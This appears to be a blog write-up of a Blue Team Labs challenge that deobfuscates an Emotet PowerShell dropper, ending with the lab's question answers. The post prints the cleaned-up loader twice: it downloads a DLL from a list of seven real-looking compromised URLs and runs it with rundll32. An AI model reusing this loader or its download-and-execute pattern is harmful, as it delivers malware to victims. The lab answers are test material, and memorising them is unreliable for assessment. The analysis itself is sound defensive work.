---
title: [Investigation] - Malicious PowerShell Analysis
author:
  name: kill5witch
  link: https://github.com/an9k0r
date: 2022-05-19 17:33:00 +0100
categories: [BlueTeamLabs, Incident Response]
tags: [PowerShell, CyberChef, Malware]
math: true
mermaid: true
image:
  src: /assets/images/2022-05-20-15-59-22.png
  width: 694
  height: 515
  alt: image alternative text
---
**Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware.**
# Scenario
> Recently the networks of a large company named GothamLegend were compromised after an employee opened a phishing email containing malware. The damage caused was critical and resulted in business-wide disruption. GothamLegend had to reach out to a third-party incident response team to assist with the investigation. You are a member of the IR team - all you have is an encoded Powershell script. Can you decode it and identify what malware is responsible for this attack?  

# Downloading Powershell File
For this challenge, we don't actually get an access to a box, but just a simple powershell file that we have to download to disk. It's a simple PS command and we have to investigate what it does.

![](/assets/images/2022-05-19-19-39-44.png)

# Basic Base64 Deobfuscation
Let's copy and paste command into Cyberchef (https://gchq.github.io/CyberChef/) and set the filters "From Base64" and "Decode text" with "UTF-16LE".
Doing that we can actually see the command:

![](/assets/images/2022-05-19-19-44-04.png)

So we can see some code there, but it's still pretty unreadable. Let's throw `Generic Code Beautify` in there.

![](/assets/images/2022-05-20-08-35-05.png)

# Analyzing level of obfuscation

So we can see few techniques that were used for obfuscating this code.

## Random Case
It's actualy all over.
```
... sEt MKu ...
```
We could use `ToLowerCase` which might break the code but increase readability.

![](/assets/images/2022-05-20-08-38-39.png)

I will use this with caution and might disable it.

## Backticks
Example:
```
do`wnl`oad`file
```
Let's use `Find/Replace` for this one.

![](/assets/images/2022-05-20-08-41-22.png)

So strings, especially longer ones, are getting more readable.

## Discatenation
Example
```
adm' + 'int' + 'k.c' + 'o' + 'm/' + 'w'
```
Since there are more different patterns i've had a hard time to find a right balance which signs to take away in order to not to break the code to much. This is no fancy regex, but it has made the code a little bit more readable.

![](/assets/images/2022-05-20-13-50-10.png)

## Reorder
```
[type]("{0}{1}{2}{4}{3}" -f 'syst','em.','io.di','ory','rect')
```
As there are only two occurences i'll reverse the strings using powershell and put the strings back into the code.
```
PS C:\> echo ("{0}{1}{2}{4}{3}" -f 'syst','em.','io.di','ory','rect') | out-string
system.io.directory

PS C:\> echo ("{6}{8}{0}{3}{4}{5}{2}{7}{1}" -f'stem','ger','ma','.n','et.servicepoi','nt','s','na','y')
system.net.servicepointmanager
```

# Manually "cleaning" the rest of the code.
This is what i have now
![](/assets/images/2022-05-20-13-57-30.png)

I'll clean few other spots

# Ascii character conversions
```
[char]92
```
This ones can be simply put into powershell

![](/assets/images/2022-05-20-14-31-53.png)

After cleaning some parentshesis manually this is what i've ended up with
```powershell
set mku([type](system.io.directory));
set-item('variable:mbu')[type](system.net.servicepointmanager);
$erroractionpreference = (('silentlycontinue'));
$cvmmq4o = $q26l  +  "@"  +  $e16h;
$j16j = 'n_0p';
(dir variable:mku).value::"createdirectory"($home  +  (('{0}db_bh30{0}yf5be5g{0}')  -f "\"));
$c39y = 'u68s';
(variable("mbu") -valueon )::"securityprotocol" = ('tls12'));
$f35i = 'i4_b';
$swrp6tc = 'a69s';
$x27h = 'c33o';
$imd1yck = $home + ('uohdb_bh30uohyf5be5guoh')."replace"('uoh', "\") + $swrp6tc + '.dll';
$k47v = 'r49g';
$b9fhbyv = (']anw[3s://admintk.com/wp-admin/l/@]anw[3s://mikegeerinck.com/c/yysa/@]anw[3://freelancerwebdesignerhyderabad.com/cgi-bin/s/@]anw[3://etdog.com/wp-content/nu/@]anw[3s://www.hintup.com.br/wp-content/de/@]anw[3://www.stmarouns.nsw.edu.au/paypal/b8g/@]anw[3://wm.mcdevelop.net/content/6f2gd/')."replace"(']anw[3', ([array]('sd', 'sw'), 'http', '3d')[1])."split"($c83r  +  $cvmmq4o  +  $f10q);
$q52m = 'p05k';
foreach ($bm5pw6z in $b9fhbyv) {
    try {
        (&('new-object') system.net.webclient)."downloadfile"($bm5pw6z, $imd1yck);
        $z10l = ('a92q');
        if ((&('get-item') $imd1yck)."length"  - ge 35698)  {
            &('rundll32') $imd1yck, (('control_rundll')."tostring"();
            $r65i = ('z09b'));
            break;
            $k7_h = ('f12u')
        }
    } catch {}

}
$w54i = 'v95o'
```

## Replacing the Replace function manually
Now let's replace the Replace function
Here
```powershell
$imd1yck = $home + ('uohdb_bh30uohyf5be5guoh')."replace"('uoh', "\") + $swrp6tc + '.dll';
```
Which becomes
```
$imd1yck = $home + '\db_bh30\yf5be5g\' + $swrp6tc + '.dll'
```

And second string:
```powershell
(']anw[3s://admintk.com/wp-admin/l/@]anw[3s://mikegeerinck.com/c/yysa/@]anw[3://freelancerwebdesignerhyderabad.com/cgi-bin/s/@]anw[3://etdog.com/wp-content/nu/@]anw[3s://www.hintup.com.br/wp-content/de/@]anw[3://www.stmarouns.nsw.edu.au/paypal/b8g/@]anw[3://wm.mcdevelop.net/content/6f2gd/')."replace"(']anw[3', ([array]('sd', 'sw'), 'http', '3d')[1])."split"($c83r  +  $cvmmq4o  +  $f10q)
```
Gives as an array of URLs. First `]anw[3` gets replaces by `http` and then `split happens with` a `@` which is saved in `$cvmmq4o`.

We end up with simple array.
```powershell
$b9fhbyv = 'https://admintk.com/wp-admin/l/','https://mikegeerinck.com/c/yysa/','http://freelancerwebdesignerhyderabad.com/cgi-bin/s/','http://etdog.com/wp-content/nu/','https://www.hintup.com.br/wp-content/de/','http://www.stmarouns.nsw.edu.au/paypal/b8g/','http://wm.mcdevelop.net/content/6f2gd/'
```

Now our command looks like this
```powershell
set mku([type](system.io.directory));
set-item('variable:mbu')[type](system.net.servicepointmanager);
$erroractionpreference = 'silentlycontinue';
$cvmmq4o = $q26l  +  "@"  +  $e16h;
$j16j = 'n_0p';
(dir variable:mku).value::"createdirectory"($home  +  '\db_bh30\yf5be5g\');
$c39y = 'u68s';
(variable("mbu") -valueon)::"securityprotocol" = 'tls12';
$f35i = 'i4_b';
$swrp6tc = 'a69s';
$x27h = 'c33o';
$imd1yck = $home + '\db_bh30\yf5be5g\a69s.dll';
$k47v = 'r49g';
$b9fhbyv = 'https://admintk.com/wp-admin/l/','https://mikegeerinck.com/c/yysa/','http://freelancerwebdesignerhyderabad.com/cgi-bin/s/','http://etdog.com/wp-content/nu/','https://www.hintup.com.br/wp-content/de/','http://www.stmarouns.nsw.edu.au/paypal/b8g/','http://wm.mcdevelop.net/content/6f2gd/'
$q52m = 'p05k';
foreach ($bm5pw6z in $b9fhbyv) {
    try {
        (&('new-object') system.net.webclient)."downloadfile"($bm5pw6z, $imd1yck);
        $z10l = ('a92q');
        if ((&('get-item') $imd1yck)."length"  - ge 35698)  {
            &('rundll32') $imd1yck, ('control_rundll')."tostring"();
            $r65i = 'z09b';
            break;
            $k7_h = 'f12u'
        }
    } catch {}

}
$w54i = 'v95o'
```
# Determening Malware 
Simple google search point as to MalwareBazaar

![](/assets/images/2022-05-20-15-42-03.png)

If we check inteligence data we see it's probably related to Emotet Family

![](/assets/images/2022-05-20-15-43-34.png)

# Answering Questions
Please note that i've used `ToLowerCase` function and as this helps with readability, it also impacts file and directory names!

> What security protocol is being used for the communication with a malicious domain? TLS 1.2

> What directory does the obfuscated PowerShell create? (Starting from \HOME\) \home\db_bh30\yf5be5g\

> What file is being downloaded (full name)? a69s.dll

> What is used to execute the downloaded file? rundll32

> What is the domain name of the URI ending in ‘/6F2gd/’? wm.mcdevelop.net

> Based on the analysis of the obfuscated code, what is the name of the malware? Emotet

# Reference
https://malware.news/t/deobfuscating-powershell-putting-the-toothpaste-back-in-the-tube/23509
